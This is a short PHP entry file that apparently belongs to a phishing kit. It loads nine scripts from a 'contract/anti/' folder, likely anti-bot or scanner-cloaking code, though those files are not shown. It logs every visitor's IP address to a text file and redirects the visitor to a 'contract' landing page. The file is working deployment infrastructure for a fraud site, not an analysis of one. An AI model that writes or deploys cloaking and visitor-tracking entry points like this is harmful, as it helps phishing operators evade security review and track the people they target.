<?php
include "contract/anti/genius.php";
include "contract/anti/genius1.php"; 
include "contract/anti/genius2.php"; 
include "contract/anti/genius3.php"; 
include "contract/anti/genius4.php"; 
include "contract/anti/genius5.php"; 
include "contract/anti/genius6.php"; 
include "contract/anti/genius7.php"; 
include "contract/anti/genius8.php"; 
$ipp=$_SERVER['REMOTE_ADDR'];
$fila=fopen("vues.txt","a");
fwrite($fila, $ipp."\n");
fclose($fila);
header("location: contract/index.php")


?>